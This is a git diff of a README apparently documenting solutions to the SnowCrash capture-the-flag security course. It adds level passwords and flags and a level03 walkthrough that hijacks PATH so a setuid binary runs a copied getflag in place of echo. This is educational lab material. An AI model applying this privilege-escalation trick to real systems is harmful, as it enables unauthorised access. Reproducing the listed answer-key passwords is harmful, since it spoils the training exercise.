@@ -12,6 +12,7 @@ This project will be an introduction to cyber security.
 | level02 | f2av5il02puano7naaf6adaaf |
 | flag02  | ft_waNDReL0L              |
 | level03 | kooda2puivaav1idi4f57q8iq |
+| level04 | qi0maab88jeaj46qoumi7maus |
 
 ## Script
 
@@ -29,7 +30,7 @@ cdiiddwpgswtgt
 ```
 
 - [identify encryption method](https://www.dcode.fr/identification-chiffrement)
-- [decrypt ceasar code](https://www.dcode.fr/chiffre-cesar)
+- [decrypt cesar code](https://www.dcode.fr/chiffre-cesar)
 
 ### level01
 
@@ -51,3 +52,13 @@ No password hashes left to crack (see FAQ)
 ### level02
 
 Open ``level02.pcap`` in wireshark then Statistics -> Conversations -> Tab TCP -> Follow Stream
+
+### level03
+
+```bash
+level03@SnowCrash:~$ strings ./level03 | grep Exploit
+/usr/bin/env echo Exploit me
+level03@SnowCrash:~$ cp /bin/getflag ./echo
+level03@SnowCrash:~$ PATH=$PWD ./level03
+Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
+```
